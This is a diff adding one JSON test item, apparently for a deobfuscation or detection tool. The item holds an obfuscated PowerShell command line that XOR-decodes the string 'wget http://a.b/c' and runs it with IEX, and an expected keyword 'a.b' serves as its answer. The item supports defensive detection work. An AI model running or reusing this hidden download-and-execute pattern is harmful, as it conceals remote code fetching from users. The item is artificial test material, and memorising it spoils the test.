@@ -1,0 +1,10 @@
+{
+  "id": "ps-xor-ascii-7",
+  "category": "ps-xor-inline",
+  "command_line": "$k=[System.Text.Encoding]::ASCII.GetBytes('NivX'); $b=[byte[]](57,14,19,44,110,1,2,44,62,83,89,119,47,71,20,119,45); $d=-join(0..($b.Length-1)|%{[char]($b[$_] -bxor $k[$_ % $k.Length])}); IEX $d",
+  "expected_keywords": [
+    "a.b"
+  ],
+  "source": "nivxray-rc40-obfuscation",
+  "license": "CC-BY-4.0"
+}
